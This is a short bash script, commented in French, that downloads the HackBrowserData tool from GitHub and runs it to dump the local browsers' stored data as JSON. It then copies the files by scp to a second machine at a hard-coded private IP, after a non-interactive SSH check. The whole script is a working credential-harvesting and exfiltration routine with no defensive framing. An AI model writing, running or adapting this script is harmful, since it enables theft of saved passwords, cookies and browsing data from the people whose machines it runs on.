#!/bin/bash

# Variables
SERVER_USER="DELL"
SERVER_IP="192.168.0.117"  # Remplace par l'IP du premier PC
DEST_DIR="/home/$SERVER_USER/hackbrowserdata"

# Vérifier que SSH fonctionne avant de commencer
echo "[+] Test de connexion SSH..."
ssh -o BatchMode=yes -o ConnectTimeout=5 $SERVER_USER@$SERVER_IP "echo SSH OK" 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Erreur : Impossible de se connecter à $SERVER_IP en SSH. Vérifie ton serveur SSH."
    exit 1
fi

# Télécharger HackBrowserData
echo "[+] Téléchargement de HackBrowserData..."
wget -q --show-progress "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-linux-64bit.zip" -O hackbrowserdata.zip

# Extraire l’archive
echo "[+] Extraction..."
unzip -o hackbrowserdata.zip
chmod +x hack-browser-data

# Vérifier si le fichier exécutable existe
if [ ! -f "hack-browser-data" ]; then
    echo "[!] Erreur : Fichier hack-browser-data introuvable après extraction."
    exit 1
fi

# Exécuter HackBrowserData
echo "[+] Extraction des données..."
./hack-browser-data -o json

# Vérifier si des fichiers JSON ont été créés
if ls *.json 1> /dev/null 2>&1; then
    echo "[+] Envoi des fichiers au premier PC..."
    scp -r *.json $SERVER_USER@$SERVER_IP:$DEST_DIR
    echo "[+] Terminé ! Les fichiers sont sur $SERVER_IP:$DEST_DIR"
else
    echo "[!] Erreur : Aucun fichier JSON trouvé. HackBrowserData a peut-être échoué."
    exit 1
fi
